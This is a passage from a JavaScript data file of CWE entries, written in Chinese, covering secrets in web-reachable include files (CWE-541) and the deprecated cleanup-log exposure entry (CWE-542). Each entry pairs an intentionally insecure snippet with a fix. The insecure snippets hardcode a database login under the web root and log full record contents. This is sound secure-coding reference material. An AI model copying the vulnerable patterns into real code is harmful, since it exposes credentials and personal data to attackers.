		status: 'Complete',
		what: `把敏感資訊放在「include 檔」裡。程式把會被 include 進其他檔案的片段檔（include file）寫成明明包含使用
		username 與 password 的程式碼、以及 vaïve 的內部參數，卻又把這個 include 檔放到可被直接存取的來源路徑(網頁根、
		公共目錄)。既然 include 檔的「內容」會被如何組合是程式層的事，很多人誤以為它的物理存在在外面「不可見」，但一旦它也長
		在可下載區或回應可召喚地帶，它用於注入的敏感值就外洩了。若 include 檔能被當成自己頁面拉取，裡面諸如
		資料庫帳號密碼、API key、連線常數都公開了。後果是寫在 include 中的機密與組態被未授權存取者整包讀走、攻擊面
		因「知道確切值」而增大。修法是含機密的 include 檔一律放在文件根之外、不經由公共 URL 可分派；include 內也不寫死
		機密，改由環境／保管庫讀取，並對公共根可能觸及的含機密副檔名吸附回 404。`,
		problem: `// 不安全寫法:把資料庫帳密寫進 include 檔並放在可下載目錄
/* config.inc.js 置於 /webroot/ 下 */
const DB = { user: 'admin', pass: 'DbP@ss1' };   // GET /config.inc.js 即可讀走
`,		fixed: `// 安全寫法:含機密檔移到文件根外並改由環境變數注入
/* config.inc.js 擺在 /etc/app/config.cjs(文件根之外) */
const DB = { user: process.env.DBUSER, pass: readSecret('DB_PASS') };`,
		patch: `@@
-  /* config.inc.js 置於 /webroot/ 下 */
-  const DB = { user: 'admin', pass: 'DbP@ss1' };
+  /* config 在文件根外,機密注入 */
+  const DB = { user: process.env.DBUSER, pass: readSecret('DB_PASS') };`,
		refs: ['CWE-541', 'OWASP'],
		tags: ['include-file','information-exposure','credentials','secrets'],
	},
	{
		id: 'CWE-542',
		name: 'DEPRECATED: Information Exposure Through Cleanup Log Files',
		lang: 'javascript',
		status: 'Deprecated',
		what: `已棄置的條目。原指「透過清理/移除資料時所產生的日誌洩漏資訊」：回收、轉換或刪除資料的流程在 cleanup
		日誌/記錄中寫入本該停住的敏感資料，之後日誌被不當讀取而外洩。此條目因抽象層級過低（同樣只是資訊外洩的細微特例）
		被取消，已收納在 CWE-532(Insertion of Sensitive Information into Log File) 底下。判讀與評估時勿再把 CWE-542
		當成現役編號引用，凡「敏感資料進入任何日誌（含 cleanup/資料處理流程的記錄）」一律以 CWE-532 處理——任何會寫入
		日誌的值都要先消毒，不把個資／機密內容寫進記錄，並確保日誌檔與其存取皆受控。`,
		problem: `// （已棄置）CWE-542 已併入 CWE-532
function purge(id) { logger.info('purged ' + full_record(id)); }`,
		fixed: `// 依 CWE-532:即使 cleanup 記錄也不含內容機密
function purge(id) { logger.info('purged record ' + id); }   // 只記 id,不記內文`,
		patch: `@@
-  // CWE-542 重定位至 CWE-532
-  function purge(id) { logger.info('purged ' + full_record(id)); }
+  // CWE-532:日誌不記內容機密
+  function purge(id) { logger.info('purged record ' + id); }`,
		refs: ['CWE-542', 'CWE-532'],
		tags: ['deprecated','cleanup','logging','information-exposure'],
	},
];